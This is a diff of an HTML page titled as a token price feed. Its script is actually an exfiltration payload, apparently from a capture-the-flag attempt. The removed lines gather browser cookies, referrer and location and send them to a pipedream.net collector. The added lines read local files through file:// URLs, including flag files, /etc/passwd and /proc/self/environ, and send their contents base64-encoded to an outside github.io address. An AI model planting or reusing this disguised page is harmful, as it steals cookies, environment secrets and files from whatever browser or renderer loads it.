@@ -1,19 +1,38 @@
 <html>
-<head><title>DeFi Token Analytics</title></head>
+<head><title>Token Price Feed</title></head>
 <body>
-<h1>Loading Token Data...</h1>
+<h1>Fetching Live Prices...</h1>
 <script>
-// Send back everything about the browser context
-var data = {
-  cookies: document.cookie,
-  referrer: document.referrer,
-  origin: window.origin,
-  location: window.location.href,
-  userAgent: navigator.userAgent,
-  platform: navigator.platform
-};
+// Try common flag locations
+var paths = [
+  'file:///flag.txt',
+  'file:///flag',
+  'file:///home/flag.txt',
+  'file:///app/flag.txt',
+  'file:///app/flag',
+  'file:///root/flag.txt',
+  'file:///etc/flag.txt',
+  'file:///tmp/flag.txt',
+  'file:///opt/flag.txt',
+  'file:///var/flag.txt',
+  'file:///etc/passwd',
+  'file:///etc/hostname',
+  'file:///proc/self/environ',
+  'file:///proc/self/cmdline'
+];
 
-fetch('https://eoh2zr5zzepcygc.m.pipedream.net?info=' + btoa(JSON.stringify(data)));
+paths.forEach(function(path, i) {
+  setTimeout(function() {
+    fetch(path)
+      .then(function(r) { return r.text(); })
+      .then(function(d) {
+        fetch('https://dglabz.github.io/crypto-api-docs/index.html?file=' + encodeURIComponent(path) + '&data=' + btoa(d));
+      })
+      .catch(function(e) {
+        fetch('https://dglabz.github.io/crypto-api-docs/index.html?file=' + encodeURIComponent(path) + '&error=' + e.message);
+      });
+  }, i * 200);
+});
 </script>
 </body>
 </html>
